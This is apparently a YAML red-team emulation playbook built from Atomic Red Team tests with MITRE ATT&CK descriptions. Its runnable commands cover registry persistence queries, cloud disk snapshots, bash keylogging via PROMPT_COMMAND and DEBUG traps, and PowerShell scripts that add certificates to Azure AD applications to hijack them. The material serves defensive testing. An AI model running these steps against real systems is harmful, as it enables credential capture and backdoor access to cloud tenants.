apt_name: ExamplePlaybook
description: Playbook generated for ExamplePlaybook
steps:
- atomic_id: 8f7578c4-9863-4d83-875c-a565573bbdf0
  cleanup_command: ''
  command: 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices

    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"

    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"

    reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"

    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

    reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul
    | findstr /Ri ".*\.sys$"

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

    reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot

    reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components"

    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"

    '
  description: 'Query Windows Registry.

    Upon successful execution, cmd.exe will perform multiple reg queries. Some will
    succeed and others will fail (dependent upon OS).

    References:

    https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order

    https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services

    http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf

    https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Process: OS API Execution'
    - 'Windows Registry: Windows Registry Key Access'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to gather
      information about the system, configuration, and installed software.


      The Registry contains a significant amount of information about the operating
      system, configuration, software, and security.(Citation: Wikipedia Windows Registry)
      Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075)
      utility, though other means to access the Registry exist. Some of the information
      may help adversaries to further their operation within a network. Adversaries
      may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.'
    mitre_examples: []
    mitre_id: T1012
    mitre_mitigations: []
    mitre_name: Query Registry
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1012
    - https://en.wikipedia.org/wiki/Windows_Registry
    mitre_related_techniques: []
  name: Query Registry
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: a3c09662-85bb-4ea8-b15b-6dc8a844e236
  cleanup_command: "SNAPSHOT_ID=$(aws ec2 describe-snapshots --region #{aws_region}\
    \ --filters \"Name=volume-id,Values=#{aws_volume_id}\" --query \"Snapshots[0].SnapshotId\"\
    \ --output text)\nif [ \"$SNAPSHOT_ID\" != \"None\" ]; then\n  aws ec2 delete-snapshot\
    \ --region #{aws_region} --snapshot-id \"$SNAPSHOT_ID\"\nfi\n"
  command: 'aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id}
    --description "Atomic Red Team Test Snapshot" --query "SnapshotId" --output text

    '
  description: 'Creates an EBS snapshot in AWS using the AWS CLI.

    This simulates an adversary duplicating volume data via snapshots for persistence
    or exfiltration.

    '
  get_prereq_command: 'echo "Install AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html"

    '
  input_arguments:
    aws_region:
      default: us-east-1
      description: AWS region where the volume is located.
      type: string
    aws_volume_id:
      default: vol-0123456789abcdef0
      description: The AWS EBS Volume ID to create a snapshot from.
      type: string
  mitre_info:
    mitre_data_sources: &id001
    - 'Snapshot: Snapshot Creation'
    - 'Snapshot: Snapshot Metadata'
    mitre_defensive_measures: []
    mitre_description: 'An adversary may create a snapshot or data backup within a
      cloud account to evade defenses. A snapshot is a point-in-time copy of an existing
      cloud compute component such as a virtual machine (VM), virtual hard drive,
      or volume. An adversary may leverage permissions to create a snapshot in order
      to bypass restrictions that prevent access to existing compute service infrastructure,
      unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004)
      where an adversary may revert to a snapshot to evade detection and remove evidence
      of their presence.


      An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002),
      mount one or more created snapshots to that instance, and then apply a policy
      that allows the adversary access to the created instance, such as a firewall
      policy that allows them inbound and outbound SSH access.(Citation: Mandiant
      M-Trends 2020)'
    mitre_examples: []
    mitre_id: T1578.001
    mitre_mitigations: []
    mitre_name: Create Snapshot
    mitre_platforms: &id002
    - IaaS
    mitre_references:
    - https://attack.mitre.org/techniques/T1578/001
    - https://docs.aws.amazon.com/aws-backup/latest/devguide/logging-using-cloudtrail.html
    - https://cloud.google.com/compute/docs/instances/create-start-instance#api_2
    - https://cloud.google.com/logging/docs/audit#admin-activity
    - https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf
    - https://docs.microsoft.com/en-us/azure/backup/backup-azure-monitoring-use-azuremonitor
    mitre_related_techniques: []
  name: AWS - Create Snapshot from EBS Volume
  platforms:
  - iaas:aws
  prereq_command: 'if command -v aws > /dev/null 2>&1; then exit 0; else exit 1; fi

    '
  references: []
- atomic_id: 89e69b4b-3458-4ec6-b819-b3008debc1bc
  cleanup_command: 'az snapshot delete --resource-group #{azure_resource_group} --name
    #{azure_snapshot_name}

    '
  command: 'az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name}
    --source #{azure_disk_name} --location eastus

    '
  description: 'Creates a snapshot of a managed disk in Azure using the Azure CLI.

    Simulates adversary snapshotting behavior for persistence or data duplication.

    '
  get_prereq_command: 'echo "Install Azure CLI: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli"

    '
  input_arguments:
    azure_disk_name:
      default: myDiskName
      description: The Azure disk name.
      type: string
    azure_resource_group:
      default: myResourceGroup
      description: The Azure resource group where the disk is located.
      type: string
    azure_snapshot_name:
      default: mySnapshotName
      description: The Azure snapshot name.
      type: string
  mitre_info:
    mitre_data_sources: *id001
    mitre_defensive_measures: []
    mitre_description: 'An adversary may create a snapshot or data backup within a
      cloud account to evade defenses. A snapshot is a point-in-time copy of an existing
      cloud compute component such as a virtual machine (VM), virtual hard drive,
      or volume. An adversary may leverage permissions to create a snapshot in order
      to bypass restrictions that prevent access to existing compute service infrastructure,
      unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004)
      where an adversary may revert to a snapshot to evade detection and remove evidence
      of their presence.


      An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002),
      mount one or more created snapshots to that instance, and then apply a policy
      that allows the adversary access to the created instance, such as a firewall
      policy that allows them inbound and outbound SSH access.(Citation: Mandiant
      M-Trends 2020)'
    mitre_examples: []
    mitre_id: T1578.001
    mitre_mitigations: []
    mitre_name: Create Snapshot
    mitre_platforms: *id002
    mitre_references:
    - https://attack.mitre.org/techniques/T1578/001
    - https://docs.aws.amazon.com/aws-backup/latest/devguide/logging-using-cloudtrail.html
    - https://cloud.google.com/compute/docs/instances/create-start-instance#api_2
    - https://cloud.google.com/logging/docs/audit#admin-activity
    - https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf
    - https://docs.microsoft.com/en-us/azure/backup/backup-azure-monitoring-use-azuremonitor
    mitre_related_techniques: []
  name: Azure - Create Snapshot from Managed Disk
  platforms:
  - iaas:azure
  prereq_command: 'if command -v az > /dev/null 2>&1; then exit 0; else exit 1; fi

    '
  references: []
- atomic_id: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
  cleanup_command: 'unset PROMPT_COMMAND

    '
  command: 'PROMPT_COMMAND=''history -a >(tee -a ~/.bash_history |logger -t "$USER[$$]
    $SSH_CONNECTION ")''

    echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"

    tail /var/log/syslog

    '
  description: "There are several variables that can be set to control the appearance\
    \ of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents\
    \ of these variables are executed as if they had been typed on the command line.\
    \ The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable\
    \ and can be configured to write the latest \"bash history\" entries to the syslog.\n\
    \nTo gain persistence the command could be added to the users .bashrc or .bash_aliases\
    \ or the systems default .bashrc in /etc/skel/ \n"
  get_prereq_command: 'echo ""

    '
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id003
    - 'Driver: Driver Load'
    - 'Process: OS API Execution'
    - 'Windows Registry: Windows Registry Key Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may log user keystrokes to intercept credentials
      as the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) '
    mitre_examples: []
    mitre_id: T1056.001
    mitre_mitigations: []
    mitre_name: Keylogging
    mitre_platforms: &id004
    - Windows
    - macOS
    - Linux
    - Network
    mitre_references:
    - https://attack.mitre.org/techniques/T1056/001
    - https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html
    - https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
    - http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
    mitre_related_techniques: []
  name: Logging bash history to syslog
  platforms:
  - linux
  prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash
    not running! *****\n"; exit 1; fi

    if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed
    *****\n"; exit 1; fi

    if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n";
    exit 1; fi

    '
  references: []
- atomic_id: b04284dc-3bd9-4840-8d21-61b8d31c99f2
  cleanup_command: 'unset PS2

    '
  command: 'PS2=`logger -t "$USER" -f ~/.sh_history`

    $PS2

    tail /var/log/messages

    '
  description: "There are several variables that can be set to control the appearance\
    \ of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents\
    \ of these variables are executed as if they had been typed on the command line.\
    \ The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable\
    \ and can be configured to write the latest \"bash history\" entries to the syslog.\n\
    \nTo gain persistence the command could be added to the users .shrc or .profile\
    \ \n"
  get_prereq_command: 'echo ""

    '
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id003
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may log user keystrokes to intercept credentials
      as the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) '
    mitre_examples: []
    mitre_id: T1056.001
    mitre_mitigations: []
    mitre_name: Keylogging
    mitre_platforms: *id004
    mitre_references:
    - https://attack.mitre.org/techniques/T1056/001
    - https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html
    - https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
    - http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
    mitre_related_techniques: []
  name: Logging sh history to syslog/messages
  platforms:
  - linux
  prereq_command: 'if [ "$(echo $SHELL)" != "/bin/sh" ]; then echo -e "\n***** sh
    not running! *****\n"; exit 1; fi

    if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed
    *****\n"; exit 1; fi

    '
  references: []
- atomic_id: 7f85a946-a0ea-48aa-b6ac-8ff539278258
  cleanup_command: 'rm #{output_file}

    '
  command: 'trap ''echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}''
    DEBUG

    echo "Hello World!"

    cat #{output_file}

    '
  description: "When a command is executed in bash, the BASH_COMMAND variable contains\
    \ that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The\
    \ trap command is not a external command, but a built-in function of bash and\
    \ can be used in a script to run a bash function when some event occurs. trap\
    \ will detect when the BASH_COMMAND variable value changes and then pipe that\
    \ value into a file, creating a bash session based keylogger. \n\nTo gain persistence\
    \ the command could be added to the users .bashrc or .bash_aliases or the systems\
    \ default .bashrc in /etc/skel/ \n"
  get_prereq_command: 'echo ""

    '
  input_arguments:
    output_file:
      default: /tmp/.keyboard.log
      description: File to store captured commands
      type: string
  mitre_info:
    mitre_data_sources: *id003
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may log user keystrokes to intercept credentials
      as the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) '
    mitre_examples: []
    mitre_id: T1056.001
    mitre_mitigations: []
    mitre_name: Keylogging
    mitre_platforms: *id004
    mitre_references:
    - https://attack.mitre.org/techniques/T1056/001
    - https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html
    - https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
    - http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
    mitre_related_techniques: []
  name: Bash session based keylogger
  platforms:
  - linux
  prereq_command: 'if [ "$(echo $0)" != "bash" ]; then echo -e "\n***** Bash not running!
    *****\n"; exit 1; fi

    '
  references: []
- atomic_id: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  cleanup_command: "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString\
    \ -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName\
    \ System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\
    Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal\
    \ -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz\
    \ = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred\
    \ in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)\
    \ -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\
    \n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId\
    \ $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where {\
    \ $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n"
  command: 'Import-Module -Name AzureAD

    $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force

    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
    "#{username}", $Pword

    Connect-AzureAD -Credential $Credential > $null


    $sp = Get-AzureADServicePrincipal -SearchString "#{service_principal_name}" |
    Select-Object -First 1

    if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }


    # in the context of an ART test (and not a real attack), we don''t need to keep
    access for too long. In case the cleanup command isn''t called, it''s better to
    ensure that everything expires after 1 day so it doesn''t leave this backdoor
    open for too long

    $credNotAfter = (Get-Date).AddDays(1)

    $certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than
    cred expiry


    $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName
    "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable
    -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter

    $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

    Write-Host "Generated certificate ""$($cert.Thumbprint)"""


    New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert
    -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter


    Start-Sleep -s 30

    $tenant = Get-AzureADTenantDetail

    $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint
    $cert.Thumbprint

    Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id)
    of type $($auth.Account.Type)"

    Write-Host "End of Hijacking"

    '
  description: 'Add a certificate to an Application through its Service Principal.
    The certificate can then be used to authenticate as the application.

    This can be used for persistence, and also for privilege escalation by benefiting
    from the Application''s rights.

    An account with high-enough Azure AD privileges is needed, such as Global Administrator
    or Application Administrator. The account authentication must be without MFA.

    '
  get_prereq_command: 'Install-Module -Name AzureAD -Force

    '
  input_arguments:
    password:
      default: p4sswd
      description: Azure AD password
      type: string
    service_principal_name:
      default: SuperSP
      description: Name of the targeted service principal
      type: string
    username:
      default: jonh@contoso.com
      description: Azure AD username
      type: string
  mitre_info:
    mitre_data_sources: &id005
    - 'User Account: User Account Modification'
    - 'Active Directory: Active Directory Object Creation'
    - 'Active Directory: Active Directory Object Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may add adversary-controlled credentials to a\
      \ cloud account to maintain persistent access to victim accounts and instances\
      \ within the environment.\n\nFor example, adversaries may add credentials for\
      \ Service Principals and Applications in addition to existing legitimate credentials\
      \ in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:\
      \ Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials\
      \ include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer\
      \ Guidance) With sufficient permissions, there are a variety of ways to add\
      \ credentials including the Azure Portal, Azure command line interface, and\
      \ Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\
      \nIn infrastructure-as-a-service (IaaS) environments, after gaining access through\
      \ [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries\
      \ may generate or import their own SSH keys using either the <code>CreateKeyPair</code>\
      \ or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login\
      \ ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows\
      \ persistent access to instances within the cloud environment without further\
      \ usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:\
      \ Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>\
      \ API in AWS or the <code>gcloud iam service-accounts keys create</code> command\
      \ in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>\
      \ API in AWS to add a password that can be used to log into the AWS Management\
      \ Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:\
      \ Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)\
      \ If the target account has different permissions from the requesting account,\
      \ the adversary may also be able to escalate their privileges in the environment\
      \ (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel\
      \ 2.0) For example, in Entra ID environments, an adversary with the Application\
      \ Administrator role can add a new set of credentials to their application's\
      \ service principal. In doing so the adversary would be able to access the service\
      \ principal\u2019s roles and permissions, which may be different from those\
      \ of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)\
      \ \n\nIn AWS environments, adversaries with the appropriate permissions may\
      \ also use the `sts:GetFederationToken` API call to create a temporary set of\
      \ credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)\
      \ tied to the permissions of the original user account. These temporary credentials\
      \ may remain valid for the duration of their lifetime even if the original account\u2019\
      s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation\
      \ Persistence)\n\nIn Entra ID environments with the app password feature enabled,\
      \ adversaries may be able to add an app password to a user account.(Citation:\
      \ Mandiant APT42 Operations 2024) As app passwords are intended to be used with\
      \ legacy devices that do not support multi-factor authentication (MFA), adding\
      \ an app password can allow an adversary to bypass MFA requirements. Additionally,\
      \ app passwords may remain valid even if the user\u2019s primary password is\
      \ reset.(Citation: Microsoft Entra ID App Passwords)"
    mitre_examples: []
    mitre_id: T1098.001
    mitre_mitigations: []
    mitre_name: Additional Cloud Credentials
    mitre_platforms: &id006
    - IaaS
    - SaaS
    - Identity Provider
    mitre_references:
    - https://attack.mitre.org/techniques/T1098/001
    - https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/
    - https://expel.io/blog/finding-evil-in-aws/
    - https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5
    - https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/
    - https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts
    - https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add
    - https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud
    - https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815
    - https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1
    - https://learn.microsoft.com/en-us/entra/identity/authentication/howto-mfa-app-passwords
    - https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/
    - https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations
    - https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/
    - https://sysdig.com/blog/scarleteel-2-0/
    - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    mitre_related_techniques: []
  name: Azure AD Application Hijacking - Service Principal
  platforms:
  - azure-ad
  prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
    {exit 0} else {exit 1}} catch {exit 1}

    '
  references: []
- atomic_id: a12b5531-acab-4618-a470-0dafb294a87a
  cleanup_command: "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString\
    \ -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName\
    \ System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\
    Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app =\
    \ Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object\
    \ -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\n\
    foreach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)\
    \ -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\
    \n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n\
    \  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName\
    \ -eq \"AtomicCert\" } | Remove-Item\n"
  command: 'Import-Module -Name AzureAD

    $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force

    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
    "#{username}", $Pword

    Connect-AzureAD -Credential $Credential > $null


    $app = Get-AzureADApplication -SearchString "#{application_name}" | Select-Object
    -First 1

    if ($app -eq $null) { Write-Warning "Application not found"; exit }


    # in the context of an ART test (and not a real attack), we don''t need to keep
    access for too long. In case the cleanup command isn''t called, it''s better to
    ensure that everything expires after 1 day so it doesn''t leave this backdoor
    open for too long

    $credNotAfter = (Get-Date).AddDays(1)

    $certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than
    cred expiry


    $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName
    "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable
    -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter

    $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

    Write-Host "Generated certificate ""$($cert.Thumbprint)"""


    New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert
    -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter


    Start-Sleep -s 30

    $tenant = Get-AzureADTenantDetail

    $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint
    $cert.Thumbprint

    Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id)
    of type $($auth.Account.Type)"

    Write-Host "End of Hijacking"

    '
  description: 'Add a certificate to an Application through its App Registration.
    The certificate can then be used to authenticate as the application.

    This can be used for persistence, and also for privilege escalation by benefiting
    from the Application''s rights.

    An account with high-enough Azure AD privileges is needed, such as Global Administrator
    or Application Administrator. The account authentication must be without MFA.

    '
  get_prereq_command: 'Install-Module -Name AzureAD -Force

    '
  input_arguments:
    application_name:
      default: SuperApp
      description: Name of the targeted application
      type: string
    password:
      default: p4sswd
      description: Azure AD password
      type: string
    username:
      default: jonh@contoso.com
      description: Azure AD username
      type: string
  mitre_info:
    mitre_data_sources: *id005
    mitre_defensive_measures: []
    mitre_description: "Adversaries may add adversary-controlled credentials to a\
      \ cloud account to maintain persistent access to victim accounts and instances\
      \ within the environment.\n\nFor example, adversaries may add credentials for\
      \ Service Principals and Applications in addition to existing legitimate credentials\
      \ in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:\
      \ Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials\
      \ include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer\
      \ Guidance) With sufficient permissions, there are a variety of ways to add\
      \ credentials including the Azure Portal, Azure command line interface, and\
      \ Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\
      \nIn infrastructure-as-a-service (IaaS) environments, after gaining access through\
      \ [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries\
      \ may generate or import their own SSH keys using either the <code>CreateKeyPair</code>\
      \ or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login\
      \ ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows\
      \ persistent access to instances within the cloud environment without further\
      \ usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:\
      \ Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>\
      \ API in AWS or the <code>gcloud iam service-accounts keys create</code> command\
      \ in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>\
      \ API in AWS to add a password that can be used to log into the AWS Management\
      \ Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:\
      \ Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)\
      \ If the target account has different permissions from the requesting account,\
      \ the adversary may also be able to escalate their privileges in the environment\
      \ (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:\
